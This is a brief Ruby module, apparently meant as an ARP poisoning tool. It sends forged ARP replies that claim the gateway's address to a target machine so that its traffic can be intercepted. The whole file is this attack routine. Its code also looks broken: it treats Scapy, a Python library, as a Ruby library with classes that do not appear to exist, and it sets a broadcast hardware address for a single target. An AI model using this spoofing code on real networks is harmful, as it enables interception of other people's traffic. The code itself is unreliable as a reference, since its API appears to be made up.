require 'scapy'

module ArpPoisoning
  def self.arp_poisoning(target_ip, gateway_ip)
    packet = Scapy::ARPPacket.new(
      op: 2,
      psrc: gateway_ip,
      pdst: target_ip,
      hwdst: 'ff:ff:ff:ff:ff:ff' # Broadcasting to all devices on the network
    )

    Scapy::send(packet, count: 5, inter: 2)
  end
end
